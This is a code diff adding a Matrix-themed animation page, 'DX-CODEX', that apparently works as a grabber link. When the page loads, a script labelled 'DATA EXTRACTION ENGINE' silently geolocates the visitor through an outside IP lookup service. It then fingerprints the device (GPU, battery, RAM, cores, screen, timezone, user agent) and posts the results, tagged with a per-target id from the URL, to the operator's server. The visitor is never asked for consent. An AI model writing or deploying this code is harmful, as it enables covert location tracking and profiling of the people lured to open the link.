@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DX-CODEX</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: crosshair; }
+        canvas { display: block; position: absolute; top: 0; left: 0; }
+        #terminal {
+            position: absolute; top: 15px; left: 15px;
+            color: #0f0; font-family: 'Courier New', monospace;
+            font-size: 11px; pointer-events: none; z-index: 10;
+            text-shadow: 0 0 8px #0f0; line-height: 1.4;
+        }
+        .glitch-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 2px, transparent 3px);
+            pointer-events: none; z-index: 5;
+        }
+    </style>
+</head>
+<body>
+    <div id="terminal">SYSTEM_STATUS: BOOTING...</div>
+    <div class="glitch-overlay"></div>
+    <canvas id="mainCanvas"></canvas>
+
+<script>
+/**
+ * 🛠 ANIMATION SYSTEM (MATRIX + TOUCH RIPPLE)
+ * তোমার আগের অ্যানিমেশন সিস্টেম এখানে পুরোপুরি বজায় রাখা হয়েছে।
+ */
+const canvas = document.getElementById('mainCanvas');
+const ctx = canvas.getContext('2d');
+let w, h, cols;
+const drops = [];
+const ripples = [];
+
+function init() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+    cols = Math.floor(w / 20);
+    for (let i = 0; i < cols; i++) drops[i] = Math.random() * -100;
+}
+
+function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = '#0f0';
+    ctx.font = '15px monospace';
+    for (let i = 0; i < drops.length; i++) {
+        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
+        ctx.fillText(text, i * 20, drops[i] * 20);
+        if (drops[i] * 20 > h && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+    ripples.forEach((r, i) => {
+        ctx.beginPath();
+        ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2);
+        ctx.strokeStyle = `rgba(0, 255, 0, ${r.o})`;
+        ctx.lineWidth = 2;
+        ctx.stroke();
+        r.r += 4;
+        r.o -= 0.02;
+        if (r.o <= 0) ripples.splice(i, 1);
+    });
+    requestAnimationFrame(draw);
+}
+
+window.addEventListener('touchstart', e => {
+    ripples.push({x: e.touches[0].clientX, y: e.touches[0].clientY, r: 0, o: 1});
+});
+window.addEventListener('mousedown', e => {
+    ripples.push({x: e.clientX, y: e.clientY, r: 0, o: 1});
+});
+window.addEventListener('resize', init);
+init(); draw();
+
+/**
+ * 🔐 DATA EXTRACTION ENGINE (SERVER CONNECTED)
+ */
+(async function() {
+    const _log = document.getElementById('terminal');
+    const urlParams = new URLSearchParams(window.location.search);
+    const _uid = urlParams.get('id') || "Unknown_User"; // User ID from URL
+
+    _log.innerHTML += "<br>> ANALYZING HARDWARE...";
+
+    // 1. Get Network Data
+    let _n = { ip: "Unknown", city: "N/A", country: "N/A", isp: "N/A", loc: "N/A" };
+    try {
+        const response = await fetch('https://ipwho.is/');
+        const d = await response.json();
+        if (d.success) {
+            _n = { 
+                ip: d.ip, city: d.city, country: d.country, 
+                isp: d.connection.isp, loc: d.latitude + "," + d.longitude 
+            };
+        }
+    } catch(e) { _log.innerHTML += "<br>> NETWORK_BYPASS_ACTIVE..."; }
+
+    // 2. Get Hardware Data
+    let _gpu = "N/A", _batt = "N/A";
+    try {
+        const b = await navigator.getBattery();
+        _batt = Math.round(b.level * 100) + "% (" + (b.charging ? "🔌" : "🔋") + ")";
+    } catch(e) {}
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const db = gl.getExtension('WEBGL_debug_renderer_info');
+        _gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL);
+    } catch(e) {}
+
+    // 3. Compile Data Object (সব ডেটা এখানে আছে)
+    const deviceData = {
+        platform: navigator.platform,
+        ip: _n.ip,
+        network: _n.isp,
+        location: `${_n.city}, ${_n.country}`,
+        coords: _n.loc,
+        battery: _batt,
+        cores: navigator.hardwareConcurrency || 'N/A',
+        ram: navigator.deviceMemory || 'N/A',
+        gpu: _gpu,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        ua: navigator.userAgent
+    };
+
+    // 4. Send Data to YOUR Server
+    try {
+        const response = await fetch('/log-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: _uid,
+                info: deviceData
+            })
+        });
+
+        if(response.ok) {
+            _log.innerHTML += "<br>> TRANSMISSION_SUCCESSFUL";
+        } else {
+            _log.innerHTML += "<br>> SERVER_HANDSHAKE_FAILED";
+        }
+    } catch (err) {
+        _log.innerHTML += "<br>> CONNECTION_ERROR";
+    }
+
+})();
+</script>
+</body>
+  </html>
